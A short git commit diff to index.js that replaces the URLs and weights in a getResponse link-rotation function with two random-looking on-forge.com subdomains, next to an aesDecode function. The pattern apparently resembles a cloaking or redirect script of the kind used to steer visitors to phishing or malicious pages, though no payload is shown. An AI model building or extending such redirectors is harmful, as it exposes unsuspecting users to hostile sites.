514bbd64fa187e376427ec97566784fffdfeddf4
animalinside <akshay.anand12@yahoo.com>
2026-05-16 10:45:22 +0530

    Modify URLs and weights in getResponse function
    Updated links in getResponse function with new URLs and weights.

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://wefghjkjyhgfg.on-forge.com/", weight: 0.5 },
-        { url: "https://wefghjkjyhgfg.on-forge.com/", weight: 0.5 }
+        { url: "https://dvhsdvsdcsdd.on-forge.com/", weight: 0.8 },
+        { url: "https://vbsdbvcdscds.on-forge.com/", weight: 0.2 }
       
     ];
 
